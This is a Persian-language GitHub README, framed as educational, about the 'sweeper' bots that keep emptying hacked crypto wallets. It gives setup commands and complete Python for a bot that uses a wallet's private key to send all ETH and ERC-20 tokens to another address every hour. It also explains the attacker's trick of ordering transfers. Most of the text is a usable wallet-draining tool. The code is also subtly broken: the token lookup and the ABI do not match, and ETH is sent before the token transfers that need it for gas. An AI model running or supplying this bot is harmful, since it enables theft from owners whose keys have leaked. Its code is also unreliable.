<div align="center">
    <h1>**این ریپازیتوری صرفا جنبه آموزشی دارد**</h1>
</div>

💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥ا

[برای مشاهده نسخه دو اینجا کلیک کنید](READMEv2.md)

💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥ا

❗❗❗👈👈 اگر برای بار اول است که این صفحه را مشاهده میکنید به سراغ نسخه شماره دو نروید! مقداری پیگیدچی دارد که ابتدا باید با این مفاهیم اشنا شوید


<div align="center">
    <h2>**بار ها پیش آمده است که والت هایی را دیده ایم که توسط هکر ها ، هک شده اند و موجودی آنها خالی شده است ، بعدا هر واریزی که به آن والت انجام شده سریعا توسط هکر از والت خارج شده است**</h2>
    <h3>**در اینجا بررسی میکنیم این عمل چگونه شکل میگیره و هکر دقیقا چیکار میکنه ، در کنار این توضیحات شما با یکی از ابزار های موجود در این زمینه اشنا میشید**</h3>
</div>

![image](https://github.com/xONEIROS/flashbots/assets/174752031/5c23e970-cee6-4d94-b009-1174cd27149c)

<div align="center">
<h3>**Warning: This tutorial and code are for educational purposes only. You are responsible for any use of this code. Please do not test these codes on your main wallet.**</h3>
  <p><h3>هشدار این اموزش و این کد ها صرفا برای یادگیری میباشند ، مسئولیت هرگونه استفاده با شما میباشد | لطفا این کدهارا روی والت اصلی خود تست نکنید</h3></p>
</div>

# ربات برداشت خودکار برای اتریوم و توکن‌های ERC-20

این اسکریپت اتوماتیک اتریوم و توکن‌های ERC-20 را از یک کیف پول به آدرس مقصد می‌فرستد و هر ساعت موجودی کیف پول را چک می‌کند. بعد از هر تراکنش هم به کمک IFTTT یک اعلان می‌فرستد. مکانیزم این ربات برای ارسال توکن های اصلی یا همان گس به این شکل است که ابتدا با api سایت کوینگکو قیمت اترویم را حساب میکند و سپس مقدار کس را به دست می اورد ، بعد از به دست آمدن گس مقدار گس را از موجودی توکن اصلی کم میکند و بقیه موجود را به توکن والت مقصد ارسال میکند

این اسکریپت میتواند ترتیب و اولویت ارسال را نیز را درک کنید ، یعنی شما میتوانید به اسکریپت تعریف کنید که ابتدا توکن های فرعی را به والت مقصد ارسال کند ( کاری که هکر ها میکنند ) بعد از ارسال توکن های فرعی ترکن گس را ارسال کند !

# در اصل هدف از ارائه این فایل ها و نحوه کار آنها این است که شما بدانید ، اگر امنیت خود را رعایت نکنید ، در صورت لو رفتن پرایوت کی شما هیچ شانسی در مقابل یک هکر حرفه ای ندارد ، بهترین راه این است تمامی موارد امنیتی مربوط به والت خود را رعایت کنید تا درگیر این مشکلات نشوید

## در زیر بصورت کامل و مرحله به مرحله میتوانید نحوه کار یکی از این ربات هارا ببینید و درک کنید
## پیش‌نیازها

1. **پایتون 3.x** روی سیستم شما نصب باشد.
2. نصب کتابخانه‌های **Web3.py**، **Requests** و **Schedule**.
3. داشتن **شناسه پروژه Infura** و **کلید API Etherscan**.
4. **حساب کاربری IFTTT** برای دریافت اعلان‌ها.

## تنظیمات

### مرحله 1: نصب پایتون

برای نصب پایتون در محیط SSH لینوکس:

```bash
sudo apt update
sudo apt install python3 python3-pip
```

### مرحله 2: نصب کتابخانه‌های مورد نیاز

```bash
pip3 install web3 requests schedule
```

### مرحله 3: دانلود فایل از گیت‌هاب

ابتدا با `git` مخزن گیت‌هاب را کلون کنید. (فرض می‌کنیم مخزن شما در آدرس `https://github.com/YOUR_GITHUB_REPO` قرار دارد):

```bash
git clone https://github.com/xONEIROS/flashbots.git
cd flashbots
```

### مرحله 4: جایگزینی موارد مورد نیاز

فایل اسکریپت را باز کنید و موارد زیر را با مقادیر واقعی جایگزین کنید:

```python
infura_url = 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'
address = 'YOUR_WALLET_ADDRESS'
private_key = 'YOUR_PRIVATE_KEY'
recipient_address = 'RECIPIENT_WALLET_ADDRESS'
etherscan_api_key = 'YOUR_ETHERSCAN_API_KEY'
ifttt_event_name = 'YOUR_EVENT_NAME'
ifttt_key = 'YOUR_IFTTT_KEY'
```

### مرحله 5: گرفتن لینک‌های API

- [دریافت شناسه پروژه Infura](https://infura.io/)
- [دریافت کلید API Etherscan](https://etherscan.io/)
- [ایجاد اپلت IFTTT](https://ifttt.com/)

### مرحله 6: اجرای اسکریپت در یک اسکرین جدید

برای اجرای اسکریپت در یک اسکرین جدید تا در پس‌زمینه اجرا شود:

ابتدا اسکرین را باز کنید:

```bash
screen -S flashbots
```

سپس اسکریپت را اجرا کنید:

```bash
python3 flashbots.py
```

برای خارج شدن از اسکرین بدون بستن آن:

```bash
Ctrl + A سپس D
```

برای برگشت به اسکرین:

```bash
screen -r flashbots
```

## کد

### 1. وارد کردن کتابخانه‌ها

```python
import time
import requests
from web3 import Web3
import schedule
```

### 2. اتصال به شبکه اتریوم

```python
infura_url = 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'
web3 = Web3(Web3.HTTPProvider(infura_url))
```

### 3. تنظیم اطلاعات کیف پول و API

```python
address = 'YOUR_WALLET_ADDRESS'
private_key = 'YOUR_PRIVATE_KEY'
recipient_address = 'RECIPIENT_WALLET_ADDRESS'
etherscan_api_key = 'YOUR_ETHERSCAN_API_KEY'
```

### 4. تنظیم اعلان‌های IFTTT

```python
ifttt_event_name = 'YOUR_EVENT_NAME'
ifttt_key = 'YOUR_IFTTT_KEY'
ifttt_url = f'https://maker.ifttt.com/trigger/{ifttt_event_name}/with/key/{ifttt_key}'
```

### 5. تابع ارسال اعلان IFTTT

```python
def send_ifttt_notification(value1, value2, value3):
    data = {'value1': value1, 'value2': value2, 'value3': value3}
    requests.post(ifttt_url, json=data)
```

### 6. تابع دریافت قیمت اتریوم

```python
def get_eth_price():
    response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd')
    data = response.json()
    return data['ethereum']['usd']
```

### 7. تابع دریافت قراردادها و موجودی توکن‌ها

```python
def get_token_contracts(wallet_address):
    url = f"https://api.etherscan.io/api?module=account&action=tokenbalance&address={wallet_address}&tag=latest&apikey={etherscan_api_key}"
    response = requests.get(url).json()
    tokens = {}
    for token in response.get('result', []):
        token_address = token['contractAddress']
        token_symbol = token['symbol']
        tokens[token_symbol] = token_address
    return tokens
```

### 8. تابع ارسال اتریوم و توکن‌ها

```python
def send_eth_and_tokens():
    eth_price = get_eth_price()
    balance = web3.eth.get_balance(address)
    balance_in_usd = (balance / 10**18) * eth_price
    
    if balance_in_usd > 5:
        gas_price = web3.eth.gas_price
        gas_limit = 21000
        amount = balance - (gas_price * gas_limit)
        nonce = web3.eth.getTransactionCount(address)
        tx = {
            'nonce': nonce,
            'to': recipient_address,
            'value': amount,
            'gas': gas_limit,
            'gasPrice': gas_price
        }
        signed_tx = web3.eth.account.signTransaction(tx, private_key)
        tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        print(f'ETH sent with hash: {web3.toHex(tx_hash)}')
        send_ifttt_notification('ETH Sent', web3.toHex(tx_hash), f'Amount: {amount / 10**18} ETH')

        tokens = get_token_contracts(address)
        erc20_abi = [
            {
                'constant': False,
                'inputs': [
                    {'name': '_to', 'type': 'address'},
                    {'name': '_value', 'type': 'uint256'}
                ],
                'name': 'transfer',
                'outputs': [{'name': '', 'type': 'bool'}],
                'type': 'function'
            }
        ]
        
        for token_name, token_address in tokens.items():
            contract = web3.eth.contract(address=Web3.toChecksumAddress(token_address), abi=erc20_abi)
            token_balance = contract.functions.balanceOf(address).call()
            if token_balance > 0:
                nonce += 1
                tx = contract.functions.transfer(recipient_address, token_balance).buildTransaction({
                    'chainId': 1,
                    'gas': 70000,
                    'gasPrice': gas_price,
                    'nonce': nonce
                })
                signed_tx = web3.eth.account.signTransaction(tx, private_key)
                tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
                print(f'{token_name} sent with hash: {web3.toHex(tx_hash)}')
                send_ifttt_notification(f'{token_name} Sent', web3.toHex(tx_hash), f'Amount: {token_balance / 10**18} {token_name}')
    else:
        print("Balance is less than $5. No transaction made.")
```

### 9. زمان‌بندی وظیفه

```python
schedule.every().hour.do(send_eth_and_tokens)

while True:
    schedule.run_pending()
    time.sleep(1)
```

## استفاده

1. مطمئن شوید که تمام کتابخانه‌های مورد نیاز نصب شده‌اند.
2. مقادیر جایگزین را با اطلاعات واقعی کیف پول و API خود جایگزین کنید.
3. اسکریپت را اجرا کنید:

   ```bash
   python main.py
   ```

اسکریپت هر ساعت یک‌بار موجودی کیف پول را چک می‌کند و در صورت بیشتر بودن از 5 دلار، وجوه را منتقل می‌کند و یک اعلان می‌فرستد.


##حتماً کلیدهای خصوصی و اطلاعات حساس خود را ایمن نگه دارید. اگر سوالی داشتید میتوانید در بخش issues مطرح کنید

<div align="center">
    <p>
        <a href="Https://x.com/0xOneiros">
            <small>twitter</small>  
        </a>
        | 
        <a href="Https://t.me/xOneiros">
            <small>telegram</small>  
        </a>
    </p>
</div>
